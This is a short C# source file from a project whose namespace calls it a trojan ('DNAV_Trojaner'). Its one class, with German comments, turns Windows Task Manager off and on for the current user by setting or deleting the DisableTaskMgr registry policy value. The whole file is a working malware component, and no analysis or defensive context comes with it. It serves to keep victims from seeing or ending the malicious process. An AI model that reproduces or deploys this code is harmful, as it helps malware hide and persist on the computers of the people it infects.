﻿using Microsoft.Win32;


namespace DNAV_Trojaner
{
    public static class Taskmanager
    {
        /// <summary>
        /// Aktiviert den Taskmanager
        /// </summary>
        public static void Enable()
        {
            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if(taskManagerKey.GetValue("DisableTaskMgr") != null)
            {
                taskManagerKey.DeleteValue("DisableTaskMgr");
            }
        }

        /// <summary>
        /// Deaktiviert den Taskmanager
        /// </summary>
        public static void Disable()
        {
            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            taskManagerKey.SetValue("DisableTaskMgr", "1");
            taskManagerKey.Close();
        }
    }
}
